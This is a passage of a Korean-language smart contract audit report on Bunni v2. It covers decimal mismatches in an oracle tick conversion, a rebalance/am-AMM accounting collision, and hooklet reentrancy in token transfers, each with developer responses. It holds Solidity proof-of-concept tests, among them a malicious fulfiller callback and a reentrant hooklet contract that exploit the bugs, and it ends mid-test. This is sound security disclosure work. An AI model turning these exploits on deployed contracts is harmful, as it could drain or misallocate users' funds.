* 현재 비율을 사용하는 대신 목표 비율로 준비금을 입금합니다. 볼트에 입금하는 것이 불가능한 경우 로직은 목표 비율이 사용된 것처럼 적절한 수수료를 청구해야 합니다.

**Bacon Labs:** [PR \#124](https://github.com/timeless-fi/bunni-v2/pull/124)에서 수정되었습니다. 필요한 솔루션이 너무 복잡하여 가치가 없기 때문에 스왑에서 볼트 수수료를 청구하는 제안된 변경 사항을 추가하지 않았습니다.

**Cyfrin:** 검증되었습니다. 이제 입금 중에 항상 목표 raw 토큰 비율이 사용되며 후속 리밸런스가 없을 때만 업데이트가 발생합니다.


### Incorrect bond/stablecoin pair decimals assumptions in `OracleUniGeoDistribution`

**Description:** `OracleUniGeoDistribution`은 두 개의 제한이 있는 기하학적 또는 균일 분포를 계산하려고 합니다. 하나는 소유자가 임의로 설정하고 다른 하나는 외부 가격 오라클에서 파생됩니다. 채권 가격은 WAD(18 소수점) 정밀도의 스케일을 해제하는 `OracleUniGeoDistribution::floorPriceToRick`에 의해 `sqrtPriceX96`으로 변환되기 전에 18 소수점의 USD 기준으로 반환됩니다:

```solidity
function floorPriceToRick(uint256 floorPriceWad, int24 tickSpacing) public view returns (int24 rick) {
    // convert floor price to sqrt price
    // assume bond is currency0, floor price's unit is (currency1 / currency0)
    // unscale by WAD then rescale by 2**(96*2), then take the sqrt to get sqrt(floorPrice) * 2**96
    uint160 sqrtPriceX96 = ((floorPriceWad << 192) / WAD).sqrt().toUint160();
    // convert sqrt price to rick
    rick = sqrtPriceX96.getTickAtSqrtPrice();
    rick = bondLtStablecoin ? rick : -rick; // need to invert the sqrt price if bond is currency1
    rick = roundTickSingle(rick, tickSpacing);
}
```

이 계산은 채권과 스테이블코인이 동일한 소수점 자릿수를 가질 것이라고 가정합니다. 그러나 다음 예를 고려하십시오:

* 채권의 가치가 정확히 1 USD라고 가정하면 가격 오라클은 `1e18`을 반환하고 `sqrtPriceX96`은 1:1 비율에 따라 `1`로 계산됩니다.
* 이는 두 통화 모두 동일한 소수점 자릿수를 갖기만 하면 비율과 일치하므로 잘 구현된 것입니다. 채권이 18 소수점 자릿수를 가지고 있고 스테이블코인이 18 소수점 자릿수를 가진 DAI라고 가정합니다.
* 가격은 `1e18 / 1e18 = 1`이 되므로 틱이 적절하게 계산됩니다.
* 반면 채권이 다른 소수점 자릿수를 가진 스테이블코인과 짝을 이루면 계산된 틱이 잘못됩니다. USDC의 경우 가격은 `1e18 / 1e6 = 1e12`가 됩니다. 이 틱 값은 계산되었어야 할 실제 값과 크게 다릅니다.

**Impact:** 소수점 자릿수가 다른 스테이블코인과 짝을 이루는 채권은 영향을 받아 LDF에 대해 잘못된 제한을 계산합니다.

**Proof of Concept:** 다음 실제 예를 고려하십시오:

```solidity
// SPDX-License-Identifier: AGPL-3.0
pragma solidity ^0.8.15;

import "./BaseTest.sol";

interface IUniswapV3PoolState {
    function slot0()
        external
        view
        returns (
            uint160 sqrtPriceX96,
            int24 tick,
            uint16 observationIndex,
            uint16 observationCardinality,
            uint16 observationCardinalityNext,
            uint8 feeProtocol,
            bool unlocked
        );
}

contract DecimalsPoC is BaseTest {
    function setUp() public override {
        super.setUp();
    }

    function test_slot0PoC() public {
        uint256 mainnetFork;
        string memory MAINNET_RPC_URL = vm.envString("MAINNET_RPC_URL");
        mainnetFork = vm.createFork(MAINNET_RPC_URL);
        vm.selectFork(mainnetFork);

        address DAI_WETH = 0xa80964C5bBd1A0E95777094420555fead1A26c1e;
        address USDC_WETH = 0x7BeA39867e4169DBe237d55C8242a8f2fcDcc387;

        (uint160 sqrtPriceX96DAI,,,,,,) = IUniswapV3PoolState(DAI_WETH).slot0();
        (uint160 sqrtPriceX96USDC,,,,,,) = IUniswapV3PoolState(USDC_WETH).slot0();

        console2.log("sqrtPriceX96DAI: %s", sqrtPriceX96DAI);
        console2.log("sqrtPriceX96USDC: %s", sqrtPriceX96USDC);
    }
}
```

Output:
```bash
Ran 1 test for test/DecimalsPoC.t.sol:DecimalsPoC
[PASS] test_slot0PoC() (gas: 20679)
Logs:
  sqrtPriceX96DAI: 1611883263726799730515701216
  sqrtPriceX96USDC: 1618353216855286506291652802704389

Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 3.30s (2.78s CPU time)

Ran 1 test suite in 4.45s (3.30s CPU time): 1 tests passed, 0 failed, 0 skipped (1 total tests)
```

로그에서 볼 수 있듯이 sqrt 가격에 상당한 차이가 있으며 이는 이 두 토큰 비율 간의 큰 틱 차이로 변환됩니다.

**Recommended Mitigation:** 채권과 스테이블코인 간의 소수점 자릿수 차이는 WAD로 스케일 해제한 후 `2**(96*2)`로 다시 스케일하기 전의 sqrt 가격 계산에 반영되어야 합니다.

**Bacon Labs:** 인지됨(Acknowledged). 채권과 스테이블코인이 동일한 소수점 자릿수를 가질 것이라고 가정하는 데 동의합니다.

**Cyfrin:** 인지됨(Acknowledged).


### Collision between rebalance order consideration tokens and am-AMM fees for Bunni pools using Bunni tokens

**Description:** 주어진 Bunni 풀에 대한 `AmAmm` 임대료는 해당 Bunni 토큰의 ERC-20 표현으로 지불되어 `BunniHook`에 저장됩니다. 적어도 하나의 기본 Bunni 토큰으로 구성된 풀의 경우, ERC-20 잔액 간의 특정 엣지 케이스 충돌로 인해 `BunniHook` 회계에 문제가 발생할 수 있습니다. 구체적으로, `IFulfiller::sourceConsideration` 콜백 중에 am-AMM 입찰을 수행하는 악의적인 이행자는 `orderOutputAmount` 상태의 인플레이션으로 인해 가능한 것보다 더 많은 Bunni 토큰이 허브에서 후크로 회계 처리되도록 강제할 수 있습니다.

```solidity
    /* pre-hook: cache output balance */
    // store the order output balance before the order execution in transient storage
    // this is used to compute the order output amount
    uint256 outputBalanceBefore = hookArgs.postHookArgs.currency.isAddressZero()
        ? weth.balanceOf(address(this))
        : hookArgs.postHookArgs.currency.balanceOfSelf();
    assembly ("memory-safe") {
@>      tstore(REBALANCE_OUTPUT_BALANCE_SLOT, outputBalanceBefore)
    }

    /* am-amm bid is performed during sourceConsideration */

    /* post-hook: compute order output amount by deducting cached balance from current balance (doesn't account for am-amm rent */
    // compute order output amount by computing the difference in the output token balance
    uint256 orderOutputAmount;
    uint256 outputBalanceBefore;
    assembly ("memory-safe") {
@>      outputBalanceBefore := tload(REBALANCE_OUTPUT_BALANCE_SLOT)
    }
    if (args.currency.isAddressZero()) {
        // unwrap WETH output to native ETH
        orderOutputAmount = weth.balanceOf(address(this));
        weth.withdraw(orderOutputAmount);
    } else {
@>      orderOutputAmount = args.currency.balanceOfSelf();
    }
@>  orderOutputAmount -= outputBalanceBefore;
```

**Impact:** 리밸런스 주문 이행 중 `BunniHook`에서 취한 재진입 조치로 인해 핵심 회계가 손상될 수 있습니다.

**Proof of Concept:** 다음 테스트는 이 잘못된 회계 가정이 어떻게 잘못된 동작을 초래할 수 있는지 보여줍니다:

```solidity
// SPDX-License-Identifier: AGPL-3.0
pragma solidity ^0.8.15;

import "./BaseTest.sol";
import "./mocks/BasicBunniRebalancer.sol";

import "flood-contracts/src/interfaces/IFloodPlain.sol";

contract RebalanceWithBunniLiqTest is BaseTest {
    BasicBunniRebalancer public rebalancer;

    function setUp() public override {
        super.setUp();

        rebalancer = new BasicBunniRebalancer(poolManager, floodPlain);
        zone.setIsWhitelisted(address(rebalancer), true);
    }

    function test_rebalance_withBunniLiq() public {
        MockLDF ldf_ = new MockLDF(address(hub), address(bunniHook), address(quoter));
        bytes32 ldfParams = bytes32(abi.encodePacked(ShiftMode.BOTH, int24(-3) * TICK_SPACING, int16(6), ALPHA));
        ldf_.setMinTick(-30);

        (, PoolKey memory key) = _deployPoolAndInitLiquidity(ldf_, ldfParams);

        // shift liquidity to the right
        // the LDF will demand more token0, so we'll have too much of token1
        ldf_.setMinTick(-20);

        // make swap to trigger rebalance
        uint256 swapAmount = 1e6;
        _mint(key.currency0, address(this), swapAmount);
        IPoolManager.SwapParams memory params = IPoolManager.SwapParams({
            zeroForOne: true,
            amountSpecified: -int256(swapAmount),
            sqrtPriceLimitX96: TickMath.MIN_SQRT_PRICE + 1
        });
        vm.recordLogs();
        _swap(key, params, 0, "");

        IdleBalance idleBalanceBefore = hub.idleBalance(key.toId());
        (uint256 balanceBefore, bool isToken0Before) = idleBalanceBefore.fromIdleBalance();
        assertGt(balanceBefore, 0, "idle balance should be non-zero");
        assertFalse(isToken0Before, "idle balance should be in token1");

        // obtain the order from the logs
        Vm.Log[] memory logs_ = vm.getRecordedLogs();
        Vm.Log memory orderEtchedLog;
        for (uint256 i = 0; i < logs_.length; i++) {
            if (logs_[i].emitter == address(floodPlain) && logs_[i].topics[0] == IOnChainOrders.OrderEtched.selector) {
                orderEtchedLog = logs_[i];
                break;
            }
        }
        IFloodPlain.SignedOrder memory signedOrder = abi.decode(orderEtchedLog.data, (IFloodPlain.SignedOrder));

        // wait for the surge fee to go down
        skip(9 minutes);

        // fulfill order using rebalancer
        rebalancer.rebalance(signedOrder, key);

        // rebalancer should have profits in token1
        assertGt(token1.balanceOf(address(rebalancer)), 0, "rebalancer should have profits");
    }

    function test_outputExcessiveBidTokensDuringRebalanceAndRefund() public {
        // Step 1: Create a new pool
        (IBunniToken bt1, PoolKey memory poolKey1) = _deployPoolAndInitLiquidity();

        // Step 2: Send bids and rent tokens (BT1) to BunniHook
        uint128 minRent = uint128(bt1.totalSupply() * MIN_RENT_MULTIPLIER / 1e18);
        uint128 bidAmount = minRent * 10 days;
        address alice = makeAddr("Alice");
        deal(address(bt1), address(this), bidAmount);
        bt1.approve(address(bunniHook), bidAmount);
        bunniHook.bid(
            poolKey1.toId(), address(alice), bytes6(abi.encodePacked(uint24(1e3), uint24(2e3))), minRent, bidAmount
        );

        // Step 3: Create a new pool with BT1 and token2
        ERC20Mock token2 = new ERC20Mock();
        MockLDF mockLDF = new MockLDF(address(hub), address(bunniHook), address(quoter));
        mockLDF.setMinTick(-30); // minTick of MockLDFs need initialization

        // approve tokens
        vm.startPrank(address(0x6969));
        bt1.approve(address(PERMIT2), type(uint256).max);
        token2.approve(address(PERMIT2), type(uint256).max);
        PERMIT2.approve(address(bt1), address(hub), type(uint160).max, type(uint48).max);
        PERMIT2.approve(address(token2), address(hub), type(uint160).max, type(uint48).max);
        vm.stopPrank();

        (Currency currency0, Currency currency1) = address(bt1) < address(token2)
            ? (Currency.wrap(address(bt1)), Currency.wrap(address(token2)))
            : (Currency.wrap(address(token2)), Currency.wrap(address(bt1)));
        (, PoolKey memory poolKey2) = _deployPoolAndInitLiquidity(
            currency0,
            currency1,
            ERC4626(address(0)),
            ERC4626(address(0)),
            mockLDF,
            IHooklet(address(0)),
            bytes32(abi.encodePacked(ShiftMode.BOTH, int24(-3) * TICK_SPACING, int16(6), ALPHA)),
            abi.encodePacked(
                FEE_MIN,
                FEE_MAX,
                FEE_QUADRATIC_MULTIPLIER,
                FEE_TWAP_SECONDS_AGO,
                POOL_MAX_AMAMM_FEE,
                SURGE_HALFLIFE,
                SURGE_AUTOSTART_TIME,
                VAULT_SURGE_THRESHOLD_0,
                VAULT_SURGE_THRESHOLD_1,
                REBALANCE_THRESHOLD,
                REBALANCE_MAX_SLIPPAGE,
                REBALANCE_TWAP_SECONDS_AGO,
                REBALANCE_ORDER_TTL,
                true, // amAmmEnabled
                ORACLE_MIN_INTERVAL,
                MIN_RENT_MULTIPLIER
            ),
            bytes32(uint256(1))
        );

        // Step 4: Trigger a rebalance for the recursive pool
        // Shift liquidity to create an imbalance such that we need to swap token2 into bt1
        // Shift right if bt1 is token0, shift left if bt1 is token1
        mockLDF.setMinTick(address(bt1) < address(token2) ? -20 : -40);

        // Make a small swap to trigger rebalance
        uint256 swapAmount = 1e6;
        deal(address(bt1), address(this), swapAmount);
        bt1.approve(address(swapper), swapAmount);
        IPoolManager.SwapParams memory params = IPoolManager.SwapParams({
            zeroForOne: address(bt1) < address(token2),
            amountSpecified: -int256(swapAmount),
            sqrtPriceLimitX96: address(bt1) < address(token2) ? TickMath.MIN_SQRT_PRICE + 1 : TickMath.MAX_SQRT_PRICE - 1
        });

        // Record logs to capture the OrderEtched event
        vm.recordLogs();
        swapper.swap(poolKey2, params, type(uint256).max, 0);

        // Find the OrderEtched event
        Vm.Log[] memory logs_ = vm.getRecordedLogs();
        Vm.Log memory orderEtchedLog;
        for (uint256 i = 0; i < logs_.length; i++) {
            if (logs_[i].emitter == address(floodPlain) && logs_[i].topics[0] == IOnChainOrders.OrderEtched.selector) {
                orderEtchedLog = logs_[i];
                break;
            }
        }
        require(orderEtchedLog.emitter == address(floodPlain), "OrderEtched event not found");

        // Decode the order from the event
        IFloodPlain.SignedOrder memory signedOrder = abi.decode(orderEtchedLog.data, (IFloodPlain.SignedOrder));
        IFloodPlain.Order memory order = signedOrder.order;
        assertEq(order.offer[0].token, address(token2), "Order offer token should be token2");
        assertEq(order.consideration.token, address(bt1), "Order consideration token should be BT1");

        // Step 5: Prepare to fulfill order and slightly increase bid during source consideration
        uint256 bunniHookBalanceBefore = bt1.balanceOf(address(bunniHook));
        console2.log("BunniHook BT1 balance before rebalance:", bt1.balanceOf(address(bunniHook)));
        console2.log(
            "BunniHub BT1 6909 balance before rebalance:",
            poolManager.balanceOf(address(hub), Currency.wrap(address(bt1)).toId())
        );

        console2.log("BunniHook token2 balance before rebalance:", token2.balanceOf(address(bunniHook)));
        console2.log(
            "BunniHub token2 6909 balance before rebalance:",
            poolManager.balanceOf(address(hub), Currency.wrap(address(token2)).toId())
        );

        // slightly exceed the bid amount
        uint128 minRent1 = minRent * 1.11e18 / 1e18;
        uint128 bidAmount1 = minRent1 * 10 days;
        assertEq(bidAmount1 % minRent1, 0, "bidAmount1 should be a multiple of minRent");
        deal(address(bt1), address(this), order.consideration.amount + bidAmount1);
        bt1.approve(address(floodPlain), order.consideration.amount);
        bt1.approve(address(bunniHook), bidAmount1);

        console2.log("address(this) bt1 balance before rebalance:", bt1.balanceOf(address(this)));

        // Fulfill the rebalance order
        floodPlain.fulfillOrder(signedOrder, address(this), abi.encode(true, bunniHook, poolKey1, minRent1, bidAmount1));

        // alice exceeds the bid amount again
        uint128 mintRent2 = minRent1 * 1.11e18 / 1e18;
        uint128 bidAmount2 = mintRent2 * 10 days;
        deal(address(bt1), address(this), bidAmount2);
        bt1.approve(address(bunniHook), bidAmount2);
        bunniHook.bid(poolKey1.toId(), alice, bytes6(abi.encodePacked(uint24(1e3), uint24(2e3))), mintRent2, bidAmount2);

        // make a claim
        bunniHook.claimRefund(poolKey1.toId(), address(this));

        console2.log("BunniHook BT1 balance after rebalance and refund:", bt1.balanceOf(address(bunniHook)));
        console2.log("BunniHook token2 balance after rebalance and refund:", token2.balanceOf(address(bunniHook)));

        console2.log(
            "BunniHub BT1 6909 balance after rebalance and refund:",
            poolManager.balanceOf(address(hub), Currency.wrap(address(bt1)).toId())
        );
        console2.log(
            "BunniHub token2 6909 balance after rebalance and refund:",
            poolManager.balanceOf(address(hub), Currency.wrap(address(token2)).toId())
        );

        console2.log("address(this) BT1 balance after refund:", bt1.balanceOf(address(this)));
        console2.log("address(this) token2 balance after refund:", token2.balanceOf(address(this)));

        console2.log(
            "address(this) gained BT1 balance after rebalance and refund:",
            bt1.balanceOf(address(address(this))) - bidAmount1
        ); // consideration amount was swapped for token2
        console2.log(
            "BunniHook gained BT1 balance after rebalance and refund:",
            bt1.balanceOf(address(bunniHook)) - bunniHookBalanceBefore
        );
    }

    // Implementation of IFulfiller interface
    function sourceConsideration(
        bytes28, /* selectorExtension */
        IFloodPlain.Order calldata order,
        address, /* caller */
        bytes calldata data
    ) external returns (uint256) {
        bool isFirst = abi.decode(data[:32], (bool));
        bytes memory context = data[32:];

        if (isFirst) {
            (BunniHook bunniHook, PoolKey memory poolKey1, uint128 rent, uint128 bid) =
                abi.decode(context, (BunniHook, PoolKey, uint128, uint128));

            console2.log(
                "BunniHook BT1 balance before bid in sourceConsideration:",
                ERC20Mock(order.consideration.token).balanceOf(address(bunniHook))
            );

            bunniHook.bid(poolKey1.toId(), address(this), bytes6(abi.encodePacked(uint24(1e3), uint24(2e3))), rent, bid);

            console2.log(
                "BunniHook BT1 balance after bid in sourceConsideration:",
                ERC20Mock(order.consideration.token).balanceOf(address(bunniHook))
            );
        } else {
            (bytes32 poolId, address bunniToken) = abi.decode(context, (bytes32, address));
            IERC20(order.consideration.token).approve(msg.sender, order.consideration.amount);
            uint128 minRent = uint128(IERC20(bunniToken).totalSupply() * 1e10 / 1e18);
            uint128 deposit = uint128(7200 * minRent);
            IERC20(order.consideration.token).approve(address(bunniHook), uint256(deposit));
            bunniHook.bid(PoolId.wrap(poolId), address(this), bytes6(0), minRent, deposit);
            return order.consideration.amount;
        }

        return order.consideration.amount;
    }

    function test_normalBidding() external {
        (IBunniToken bt1, PoolKey memory poolKey1) =
            _deployPoolAndInitLiquidity(Currency.wrap(address(token0)), Currency.wrap(address(token1)));
        deal(address(bt1), address(this), 100e18);
        uint128 minRent = uint128(IERC20(bt1).totalSupply() * 1e10 / 1e18);
        uint128 deposit = uint128(7200 * minRent);
        IERC20(address(bt1)).approve(address(bunniHook), uint256(deposit));
        bunniHook.bid(poolKey1.toId(), address(this), bytes6(0), minRent, deposit);
    }

    function test_doubleBunniTokenAccountingRevert() external {
        // swapAmount = bound(swapAmount, 1e6, 1e9);
        // feeMin = uint24(bound(feeMin, 2e5, 1e6 - 1));
        // feeMax = uint24(bound(feeMax, feeMin, 1e6 - 1));
        // alpha = uint32(bound(alpha, 1e3, 12e8));
        uint256 swapAmount = 496578468;
        uint24 feeMin = 800071;
        uint24 feeMax = 996693;
        uint32 alpha = 61123954;
        bool zeroForOne = true;
        uint24 feeQuadraticMultiplier = 18;

        uint256 counter;
        IBunniToken bt1 = IBunniToken(address(0));
        PoolKey memory poolKey1;
        while (address(bt1) < address(token0)) {
            (bt1, poolKey1) = _deployPoolAndInitLiquidity(
                Currency.wrap(address(token0)),
                Currency.wrap(address(token1)),
                bytes32(keccak256(abi.encode(counter++)))
            );
        }

        MockLDF ldf_ = new MockLDF(address(hub), address(bunniHook), address(quoter));
        bytes32 ldfParams = bytes32(abi.encodePacked(ShiftMode.BOTH, int24(-3) * TICK_SPACING, int16(6), alpha));
        {
            PoolKey memory key_;
            key_.tickSpacing = TICK_SPACING;
            vm.assume(ldf_.isValidParams(key_, TWAP_SECONDS_AGO, ldfParams, LDFType.DYNAMIC_AND_STATEFUL));
        }
        ldf_.setMinTick(-30); // minTick of MockLDFs need initialization
        vm.startPrank(address(0x6969));
        IERC20(address(bt1)).approve(address(hub), type(uint256).max);
        IERC20(address(token0)).approve(address(hub), type(uint256).max);
        vm.stopPrank();
        (, PoolKey memory key) = _deployPoolAndInitLiquidity(
            Currency.wrap(address(token0)),
            Currency.wrap(address(bt1)),
            ERC4626(address(0)),
            ERC4626(address(0)),
            ldf_,
            IHooklet(address(0)),
            ldfParams,
            abi.encodePacked(
                feeMin,
                feeMax,
                feeQuadraticMultiplier,
                FEE_TWAP_SECONDS_AGO,
                POOL_MAX_AMAMM_FEE,
                SURGE_HALFLIFE,
                SURGE_AUTOSTART_TIME,
                VAULT_SURGE_THRESHOLD_0,
                VAULT_SURGE_THRESHOLD_1,
                REBALANCE_THRESHOLD,
                REBALANCE_MAX_SLIPPAGE,
                REBALANCE_TWAP_SECONDS_AGO,
                REBALANCE_ORDER_TTL,
                true, // amAmmEnabled
                ORACLE_MIN_INTERVAL,
                MIN_RENT_MULTIPLIER
            ),
            bytes32(keccak256("random")) // salt
        );

        // shift liquidity based on direction
        // for zeroForOne: shift left, LDF will demand more token1, so we'll have too much of token0
        // for oneForZero: shift right, LDF will demand more token0, so we'll have too much of token1
        ldf_.setMinTick(zeroForOne ? -40 : -20);

        // Define currencyIn and currencyOut based on direction
        Currency currencyIn = zeroForOne ? key.currency0 : key.currency1;
        Currency currencyOut = zeroForOne ? key.currency1 : key.currency0;
        Currency currencyInRaw = zeroForOne ? key.currency0 : key.currency1;
        Currency currencyOutRaw = zeroForOne ? key.currency1 : key.currency0;

        // make small swap to trigger rebalance
        _mint(key.currency0, address(this), swapAmount);
        vm.prank(address(this));
        IERC20(Currency.unwrap(key.currency0)).approve(address(swapper), type(uint256).max);
        IPoolManager.SwapParams memory params = IPoolManager.SwapParams({
            zeroForOne: zeroForOne,
            amountSpecified: -int256(swapAmount),
            sqrtPriceLimitX96: TickMath.MIN_SQRT_PRICE + 1
        });
        vm.recordLogs();
        _swap(key, params, 0, "");

        // validate etched order
        Vm.Log[] memory logs = vm.getRecordedLogs();
        Vm.Log memory orderEtchedLog;
        for (uint256 i = 0; i < logs.length; i++) {
            if (logs[i].emitter == address(floodPlain) && logs[i].topics[0] == IOnChainOrders.OrderEtched.selector) {
                orderEtchedLog = logs[i];
                break;
            }
        }
        IFloodPlain.SignedOrder memory signedOrder = abi.decode(orderEtchedLog.data, (IFloodPlain.SignedOrder));
        IFloodPlain.Order memory order = signedOrder.order;

        // if there is no weth held in the contract, the rebalancing succeeds
        _mint(currencyOut, address(this), order.consideration.amount * 2);
        floodPlain.fulfillOrder(signedOrder, address(this), abi.encode(false, poolKey1.toId(), address(bt1)));
        vm.roll(vm.getBlockNumber() + 7200);
        bunniHook.getBidWrite(poolKey1.toId(), true);
        vm.roll(vm.getBlockNumber() + 7200);
        // reverts as there is insufficient token balance
        vm.expectRevert();
        bunniHook.getBidWrite(poolKey1.toId(), true);
    }
}
```

**Recommended Mitigation:** `rebalanceOrderHook()`가 호출될 때 잠기는 재진입 가드를 포함하도록 모든 가상 함수를 재정의하는 것을 고려하십시오.

**Bacon Labs:** 커밋 [75de098](https://github.com/timeless-fi/bunni-v2/pull/118/commits/75de098e79b268f65fbd4d9be72cb9041640a43e)에서 수정되었습니다.

**Cyfrin:** 검증되었습니다. `AmAmm` 함수들은 재진입할 수 없도록 재정의되었으며 리밸런스 주문의 활성 이행 중에는 비활성화되었습니다.

\clearpage
## Low Risk


### Token transfer hooks should be invoked at the end of execution to prevent the hooklet executing over intermediate state

**Description:** `ERC20Referrer::transfer`는 잠금 해제(unlocker) 콜백 전에 `_afterTokenTransfer()` 후크를 호출합니다(수신자가 잠겨 있다고 가정):

```solidity
function transfer(address to, uint256 amount) public virtual override returns (bool) {
    ...

    _afterTokenTransfer(msgSender, to, amount);

    // Unlocker callback if `to` is locked.
    if (toLocked) {
        IERC20Unlocker unlocker = unlockerOf(to);
        unlocker.lockedUserReceiveCallback(to, amount);
    }

    return true;
}
```

그러나 `BunniToken`은 Hooklet을 호출하도록 후크를 재정의하여 잠금 해제 콜백 실행 전 중간 상태에서 실행할 수 있으므로, 이는 콜백 이후에 수행되어야 합니다:

```solidity
function _afterTokenTransfer(address from, address to, uint256 amount) internal override {
    // call hooklet
    IHooklet hooklet_ = hooklet();
    if (hooklet_.hasPermission(HookletLib.AFTER_TRANSFER_FLAG)) {
        hooklet_.hookletAfterTransfer(msg.sender, poolKey(), this, from, to, amount);
    }
}
```

또한 `BunniHub`가 재진입 가드를 구현하더라도 Hooklet 호출을 통한 `BunniHub`와 `BunniToken` 계약 간의 교차 계약 재진입을 막지는 못합니다. 합법적인 풀에 영향을 미치는 유효한 익스플로잇은 확인되지 않았지만, 이러한 취약점이 존재하지 않는다는 보장은 없습니다. 모범 사례로서 교차 계약 재진입은 금지되어야 합니다.

**Impact:** * 잠긴 수신자는 hooklet 호출 내에서 잠금 해제(unlocker)를 호출하여 계정 잠금을 해제할 수 있습니다. 콜백은 계속 실행되어 잠금 기능을 오용하여 더 이상 잠겨 있지 않은 계정에 보상을 적립할 수 있습니다.
* 프로토콜의 추천 점수가 다른 추천인에게 잘못 적립될 수 있습니다.
* `BunniHub`에 대한 입금은 토큰 전송 후크의 hooklet 호출을 통해 `BunniToken` 전송에 재진입하여 이루어질 수 있으며, 이는 추천 보상 회계를 손상시킬 수 있습니다.

**Proof of Concept:** `BunniToken.t.sol`에 대한 다음 수정 사항은 모든 재진입 벡터를 보여줍니다:

```solidity
// SPDX-License-Identifier: AGPL-3.0
pragma solidity ^0.8.4;

import {IUnlockCallback} from "@uniswap/v4-core/src/interfaces/callback/IUnlockCallback.sol";

import {LibString} from "solady/utils/LibString.sol";

import "./BaseTest.sol";
import "./mocks/ERC20UnlockerMock.sol";

import {console2} from "forge-std/console2.sol";

contract User {
    IPermit2 internal constant PERMIT2 = IPermit2(0x000000000022D473030F116dDEE9F6B43aC78BA3);
    address referrer;
    address unlocker;
    address token0;
    address token1;
    address weth;

    constructor(address _token0, address _token1, address _weth) {
        token0 = _token0;
        token1 = _token1;
        weth = _weth;
    }

    receive() external payable {}

    function updateReferrer(address _referrer) external {
        referrer = _referrer;
    }

    function doDeposit(
        IBunniHub hub,
        IBunniHub.DepositParams memory params
    ) external payable {
        params.referrer = referrer;
        IERC20(Currency.unwrap(params.poolKey.currency1)).approve(address(PERMIT2), type(uint256).max);
        PERMIT2.approve(address(Currency.unwrap(params.poolKey.currency1)), address(hub), type(uint160).max, type(uint48).max);

        PERMIT2.approve(address(token0), address(hub), type(uint160).max, type(uint48).max);
        PERMIT2.approve(address(token1), address(hub), type(uint160).max, type(uint48).max);
        PERMIT2.approve(address(weth), address(hub), type(uint160).max, type(uint48).max);

        console2.log("doing re-entrant deposit");
        (uint256 shares,,) = hub.deposit{value: msg.value}(params);
    }

    function updateUnlocker(address _unlocker) external {
        console2.log("updating unlocker: %s", _unlocker);
        unlocker = _unlocker;
    }

    function doUnlock() external {
        if(ERC20UnlockerMock(unlocker).token().isLocked(address(this))) {
            console2.log("doing unlock");
            ERC20UnlockerMock(unlocker).unlock(address(this));
        }
    }
}

contract ReentrantHooklet is IHooklet {
    IPermit2 internal constant PERMIT2 = IPermit2(0x000000000022D473030F116dDEE9F6B43aC78BA3);
    BunniTokenTest test;
    User user;
```solidity
    IBunniHub hub;
    bool entered;

    constructor(BunniTokenTest _test, IBunniHub _hub, User _user) {
        test = _test;
        hub = _hub;
        user = _user;
    }

    receive() external payable {}

    function beforeTransfer(address sender, PoolKey memory key, IBunniToken bunniToken, address from, address to, uint256 amount) external returns (bytes4) {
        if (!entered && address(user) == to && IERC20(address(bunniToken)).balanceOf(address(user)) == 0) {
            entered = true;
            console2.log("making re-entrant deposit");

            uint256 depositAmount0 = 1 ether;
            uint256 depositAmount1 = 1 ether;
            uint256 value;
            if (key.currency0.isAddressZero()) {
                value = depositAmount0;
            } else if (key.currency1.isAddressZero()) {
                value = depositAmount1;
            }

            // deposit tokens
            IBunniHub.DepositParams memory depositParams = IBunniHub.DepositParams({
                poolKey: key,
                amount0Desired: depositAmount0,
                amount1Desired: depositAmount1,
                amount0Min: 0,
                amount1Min: 0,
                deadline: block.timestamp,
                recipient: address(user),
                refundRecipient: address(user),
                vaultFee0: 0,
                vaultFee1: 0,
                referrer: address(0)
            });

            user.doDeposit{value: value}(hub, depositParams);
        }

        return this.beforeTransfer.selector;
    }

    function afterTransfer(address sender, PoolKey memory key, IBunniToken bunniToken, address from, address to, uint256 amount) external returns (bytes4) {
        user.doUnlock();
        return this.afterTransfer.selector;
    }

    function beforeInitialize(address sender, IBunniHub.DeployBunniTokenParams calldata params)
        external
        returns (bytes4 selector) {
            return this.beforeInitialize.selector;
        }

    function afterInitialize(
        address sender,
        IBunniHub.DeployBunniTokenParams calldata params,
        InitializeReturnData calldata returnData
    ) external returns (bytes4 selector) {
        return this.afterInitialize.selector;
    }

    function beforeDeposit(address sender, IBunniHub.DepositParams calldata params)
        external
        returns (bytes4 selector) {
            return this.beforeDeposit.selector;
        }

    function beforeDepositView(address sender, IBunniHub.DepositParams calldata params)
        external
        view
        returns (bytes4 selector) {
            return this.beforeDeposit.selector;
        }

    function afterDeposit(
        address sender,
        IBunniHub.DepositParams calldata params,
        DepositReturnData calldata returnData
    ) external returns (bytes4 selector) {
        return this.afterDeposit.selector;
    }

    function afterDepositView(
        address sender,
        IBunniHub.DepositParams calldata params,
        DepositReturnData calldata returnData
    ) external view returns (bytes4 selector) {
        return this.afterDeposit.selector;
    }

    function beforeWithdraw(address sender, IBunniHub.WithdrawParams calldata params)
        external
        returns (bytes4 selector) {
            return this.beforeWithdraw.selector;
        }

    function beforeWithdrawView(address sender, IBunniHub.WithdrawParams calldata params)
        external
        view
        returns (bytes4 selector) {
            return this.beforeWithdraw.selector;
        }

    function afterWithdraw(
        address sender,
        IBunniHub.WithdrawParams calldata params,
        WithdrawReturnData calldata returnData
    ) external returns (bytes4 selector) {
        return this.afterWithdraw.selector;
    }

    function afterWithdrawView(
        address sender,
        IBunniHub.WithdrawParams calldata params,
        WithdrawReturnData calldata returnData
    ) external view returns (bytes4 selector) {
        return this.afterWithdraw.selector;
    }

    function beforeSwap(address sender, PoolKey calldata key, IPoolManager.SwapParams calldata params)
        external
        returns (bytes4 selector, bool feeOverriden, uint24 fee, bool priceOverridden, uint160 sqrtPriceX96) {
            return (this.beforeSwap.selector, false, 0, false, 0);
        }

    function beforeSwapView(address sender, PoolKey calldata key, IPoolManager.SwapParams calldata params)
        external
        view
        returns (bytes4 selector, bool feeOverriden, uint24 fee, bool priceOverridden, uint160 sqrtPriceX96) {
            return (this.beforeSwap.selector, false, 0, false, 0);
        }

    function afterSwap(
        address sender,
        PoolKey calldata key,
        IPoolManager.SwapParams calldata params,
        SwapReturnData calldata returnData
    ) external returns (bytes4 selector) {
        return this.afterSwap.selector;
    }

    function afterSwapView(
        address sender,
        PoolKey calldata key,
        IPoolManager.SwapParams calldata params,
        SwapReturnData calldata returnData
    ) external view returns (bytes4 selector) {
        return this.afterSwap.selector;
    }
}

contract BunniTokenTest is BaseTest, IUnlockCallback {
    using LibString for *;
    using CurrencyLibrary for Currency;

    uint256 internal constant MAX_REL_ERROR = 1e4;

    IBunniToken internal bunniToken;
